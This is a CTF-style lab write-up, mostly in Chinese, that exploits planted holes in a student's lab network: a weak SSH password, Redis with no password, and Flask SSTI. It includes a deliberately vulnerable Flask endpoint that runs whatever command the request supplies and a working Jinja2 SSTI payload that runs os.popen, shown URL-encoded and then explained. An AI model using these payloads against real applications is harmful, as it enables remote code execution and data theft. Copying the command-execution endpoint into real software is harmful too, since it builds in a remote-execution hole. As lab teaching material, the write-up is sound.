# attack-walkthrough

This section validates the effectiveness of deployed vulnerabilities (SSH, Redis, Flask SSTI) on proxy and internal hosts.

It demonstrates flag retrieval from the proxy host via SSH brute-force and Redis unauthorized access.

It details multiple methods to extract the internal host flag, including Flask SSTI payload exploitation and RCE execution.

------

### 漏洞效果验证——攻击机攻入代理机

#### 漏洞1——弱口令SSH

通过SSH直接登入代理机，验证证明该漏洞有效：

![image-20251127141822414](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251127141822414.png)

#### 漏洞2——Redis弱口令漏洞

攻击者无需密码即可以进入Redis，证明该漏洞有效：

![image-20251127145421736](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251127145421736.png)

#### 漏洞3——Flask SSTI漏洞

我们在虚拟机上curl该漏洞所在端口看是不是有响应，证明该漏洞有效：

![image-20251127170229827](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251127170229827.png)

### 获取flag——攻击机攻入内网机

#### 代理机flag的获取

##### 通过弱口令SSH获取flag

我们首先登录账户(登录操作见上)

直接输入密码读取flag内容：

```bash
ssh student@192.168.2.10 "cat /home/student/proxy_flag.txt"
```

![image-20251128140827479](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128140827479.png)

##### 通过Redis存储和获取flag

我们也可以通过Redis获取flag：

```bash
redis-cli -h 127.0.0.1 get proxy_flag  
```

![image-20251128141232522](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128141232522.png)

我主要使用了指令：

```bash
cat /home/student/proxy_flag.txt | redis-cli -h 127.0.0.1 -x set proxy_flag
```

其中“redis-cli -h 127.0.0.1 -x set proxy_flag”这条指令将flag的内容设置为了proxy_flag键的值，设置了Redis键值对，这样我们就可以连接本地Redis服务器直接获取flag的内容啦！

#### 内网机flag的获取

```bash
curl -X POST -d "name=%7B%7B7*7%7D%7D" http://192.168.2.10:8080/ssti
```

![image-20251128132046671](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128132046671.png)

我们可以通过RCE端点尝试：

我在app.py中，直接写了一个RCE端点：

```python
# RCE - 直接命令执行漏洞
@app.route("/rce")
def rce():
    cmd = request.args.get("cmd")
    return os.popen(cmd).read()  # 这里直接执行系统命令！
```

所以我们也可以通过RCE直接读取flag，我先在这里解释一下RCE：

RCE即远程代码执行，攻击者能够在目标系统上远程执行任意代码/命令，我写的那个RCE漏洞使得攻击者可以直接执行系统命令并返回结果：

```bash
curl "http://192.168.2.10:8080/rce?cmd=cat%20/home/kali/vuln_flask/flag.txt"
```

![image-20251128141530878](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128141530878.png)

还可以通过文件读取：

```bash
curl "http://192.168.2.10:8080/read?file=/home/kali/vuln_flask/flag.txt"
```

![image-20251128141800987](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128141800987.png)

也可以尝试SSTI端点获取：

```bash
curl -X POST -d "name=%7B%7Burl_for.__globals__.__builtins__%5B%27eval%27%5D%28%22__import__%28%27os%27%29.popen%28%27cat%20%2Fhome%2Fkali%2Fvuln_flask%2Fflag.txt%27%29.read%28%29%22%29%7D%7D" http://192.168.2.10:8080/ssti
<h1>moectf{ssti_success_2025}
 is sb</h1>
```

![image-20251128132127132](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128132127132.png)

前面几个求flag都好说，我主要想聊聊最后一个通过SSTI获取的这个方法，我为了配出来正确的payload真的是和ai疯狂调试，还是对这个漏洞感觉挺神奇的吧，就把这个漏洞的相关解释部分放这里了：

首先，这是我URL编码后的payload：

```bash
name=%7B%7Burl_for.__globals__.__builtins__%5B%27eval%27%5D%28%22__import__%28%27os%27%29.popen%28%27cat%20%2Fhome%2Fkali%2Fvuln_flask%2Fflag.txt%27%29.read%28%29%22%29%7D%7D
```

经过URL解码，哦我还是在这里解释一下URL解码吧先：

URL解码是将URL编码的字符串转换回原始字符的过程，为了安全的传输字符，有些字符在URL中不允许直接出现，这就使得URL中有些字符具有特殊的含义，URL编码就是将每个特殊字符转换为`%`后跟两个十六进制数字

python里面也有专门的URL编码解码的库函数，我们可以在python里面试试：

```python
from urllib.parse import unquote

encoded = "%7B%7Burl_for.__globals__.__builtins__%5B%27eval%27%5D%28%22__import__%28%27os%27%29.popen%28%27cat%20%2Fhome%2Fkali%2Fvuln_flask%2Fflag.txt%27%29.read%28%29%22%29%7D%7D"
decoded = unquote(encoded)
print(decoded)
```

运行结果如下：

![image-20251128143242842](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128143242842.png)

经过URL解码，我的payload变成了：

```bash
name={{url_for.__globals__.__builtins__['eval']("__import__('os').popen('cat /home/kali/vuln_flask/flag.txt').read()")}}
```

所以我们实际上执行的SSTI代码应该是：

```python
{{url_for.__globals__.__builtins__['eval']("__import__('os').popen('cat /home/kali/vuln_flask/flag.txt').read()")}}
```

其中，{{}}是基础的SSTI结构，“url_for._globals___  ”是用来访问url_for函数的全局命名空间，“builtins_['eval']”是为了获取evel函数，最后我们读取flag.txt的内容获取flag。